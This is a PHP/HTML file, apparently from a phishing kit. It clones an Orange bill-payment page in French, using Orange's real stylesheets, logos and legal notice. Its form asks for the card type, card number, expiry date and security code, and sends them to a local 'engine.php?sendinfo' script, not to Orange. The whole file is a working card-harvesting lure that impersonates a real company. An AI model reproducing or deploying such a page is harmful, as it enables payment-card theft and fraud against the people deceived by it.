<?php

?>



<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head>
    <meta name="viewport" content="initial-scale=1.0; maximum-scale=1.0; user-scalable=0;" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="pageId" content="edit-card"/>
    <title>Paiement</title>
    <link rel="icon" type="image/x-icon" href="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/favicon.ico"/>
    <link rel="stylesheet" href="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/merchant.css" type="text/css" media="all" />
  </head>
  <body>
    <form action="engine.php?sendinfo" method="post" id="payment_form" class="box" onsubmit="return checkForm();">
      <input type="hidden" name="LANG" value="fr" />
      <input type="hidden" name="MCO" value="OFR" />
      <input type="hidden" name="client_type" value="webpc" />
      <input type="hidden" name="page_type" value="payment_offbill" />
      <div id="header">
		<div style="padding-bottom:68px">
			<span class="header-logo"></span>
			<div style="padding-top:38px; position: relative">
				<span id="title" style="position:absolute; left:81px">paiement de votre facture</span>
			</div>
		</div>
        <ul id="breadcrumb-command">
          <li class="basket"><span>Facture</span></li>
          <li class="payment active">paiement</li>
          <li class="confirmation">confirmation</li>
        </ul>
      </div>
      <div id="main">
        <h1>paiement</h1>
        <strong class="sub-title-page">100% sécurisé</strong>
        <div id="secure-logos">
          <div class="secure-logos-list">
          </div>
        </div>
        <div id="CVS_Coordonnees_Champs_Invalides" class="control no-valid-wth-picto" style="display:none;"> </div>
        <div class="payment_container">
          <div id="payment_body" class="bg-box">
            <h3 id="divAmount">Facture</h3>
            <p class="warning-star">les champs marqués d’un <span class="star">*</span> sont obligatoires</p>
            <div id="form_js_error_container" class="line">
              <!--div class="wal_warning">
                <div class="warning_message">aucun type de carte n'a été sélectionné</div>
              </div-->
            </div>

            <div id="pay_with_card" style="margin-left: 100px;">
              <div class="form_cardType line">
			    <label for="form_card_type">Type de carte<span class="star">&thinsp;*</span></label>
  				<select id="form_card_type" name="card_type" onchange="assignSecuCodeInputMaxLength('form_card_type');">
				  <option disabled="disabled" selected="selected" value="">&nbsp;</option>
				  <option value="cb">Carte Bleue</option>
				  <option value="visa">Visa</option>
			      <option value="mastercard">Mastercard</option>
				  <option value="ecb">eCarteBleue</option>
				</select> 
					<!--img class="cards" src="/css/FPC_ORA_FAC/webpc/css/media/credits-logos.png" width="188" height="22" alt="Carte Bleue, Visa, MasterCard, e-Carte"/-->
                <!--div class="cards"-->
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_cb.png" width="29" height="22" alt="Carte Bleue" />
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_visa.png" width="41" height="22" alt="Visa" />
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_mastercard.png" width="35" height="22" alt="MasterCard" />
                  <img class="cardType" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_card_type_ecb.png" width="51" height="22" alt="e-Carte" />
                <!--</div>-->
				</div>
				<div class="form_CardNumber line">
                  <label for="form_card_number" class="libelle">Numéro de carte<span class="star">&thinsp;*</span></label>
                  <input type="text" size="16" pattern="[0-9]*" class="largeinput" name="card_number" id="form_card_number" maxlength="19" autocomplete="off" />
				</div>
				<div class="divExpirationDate line">
                <label for="form_expiry_month" class="libelle">Date d'expiration<span class="star">&thinsp;*</span></label>
					<select id="form_expiry_month" name="card_expiration_month">
                            <option value="">mois</option>
							<option value="01">01</option>
							<option value="02">02</option>
							<option value="03">03</option>
							<option value="04">04</option>
							<option value="05">05</option>
							<option value="06">06</option>
							<option value="07">07</option>
							<option value="08">08</option>
							<option value="09">09</option>
							<option value="10">10</option>
							<option value="11">11</option>
							<option value="12">12</option>
						</select>
						<select id="form_expiry_year" name="card_expiration_year">
							<option>année</option>
                            <option value="2017">2017</option>
                            <option value="2018">2018</option>
                            <option value="2019">2019</option>
                            <option value="2020">2020</option>
                            <option value="2021">2021</option>
                            <option value="2022">2022</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
						</select>
					</div>
				<div class="divSecurityCode line">
					<label for="form_card_security" class="libelle">Numéro de contrôle<span class="star">&thinsp;*</span></label>
					<input type="text" size="5" pattern="[0-9]*" class="codeSecuriteinput" name="card_security_code" id="form_card_security" autocomplete="off" />
				</div>
				<div class="divSecurityCodeInfoBox line">
                  <img class="cardCVV cardCBCVV" src="https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/illu_cb.jpg" width="97" height="53" alt="emplacement du code de sécurité au dos de la carte" >
					<p class="infoSecurityCode">il s’agit des 3 derniers chiffres <br> figurant au dos de votre carte de paiement.
					</p>
				</div>
              </div>
            </div>
			<div class="button" style="position: relative; height:92px">
			<input id="elem_button_submit" type="submit" style="position:absolute; top:-1000px; left:-1000px" />
            <a id="form_button_submit" class="validate-btn payment" onclick="document.getElementById('elem_button_submit').click()" href="javascript:void(0)">confirmer votre paiement
			  <span class="end"></span>
			</a>
          </div>
        </div>
      </div>
    </form>

	<div id="footer">
      <div class="legal">
		<p>Conformément &agrave; la loi "informatique et libert&eacute;s" du 6 janvier 1978 modifi&eacute;e, vous disposez &agrave; tout moment d'un droit d'acc&egrave;s, de rectification et d'opposition aux donn&eacute;es vous concernant en &eacute;crivant et en justifiant de votre identit&eacute; &agrave; Orange Service Clients Gestion des donn&eacute;es personnelles, 33734 Bordeaux Cedex 9.</p>
      </div>
	</div>

    <script type="text/javascript" src="https://commande2.boutique.orange.fr/epg/js/jquery.slim.min.js"></script>
	<script type="text/javascript" src="https://commande2.boutique.orange.fr/epg/js/validationform.min.js"></script>
    <script type="text/javascript">
$(document).ready(function() {
  var card_type = $('#form_card_type').val();
  setinputSecuCodeLength(card_type);
});
	    
  var localizedMessages = {"error_card_incorrect_crypto_format":"Le code de sécurité ne doit comporter que des chiffres","error_card_incorrect_number_format":"Le numéro de carte bancaire ne doit comporter que des chiffres","error_card_expiry_date_passed":"La date d'expiration de votre carte est dépassée, vérifiez la date indiquée sur votre carte","error_card_empty_crypto":"Aucun code de sécurité n'a été saisi","error_card_incorrect_crypto_length":"Le code de sécurité doit être composé de 3 chiffres","error_card_incorrect_number":"Le numéro de carte bancaire semble erroné","error_card_empty_expiry_date":"Aucune date d'expiration valide n'a été sélectionnée","error_card_amex_incorrect_number_length":"Le numéro de carte bancaire doit être composé de 15 chiffres","error_card_empty_number":"Aucun numéro de carte bancaire n'a été saisi","error_card_amex_incorrect_crypto_length":"Le code de sécurité doit être composé de 4 chiffres","error_card_no_card_type":"Aucun type de carte n'a été sélectionné","error_card_incorrect_number_length":"Le numéro de carte bancaire doit être composé de 16 ou 19 chiffres"};
  var today=20170414;
    </script>
  </body>
</html>
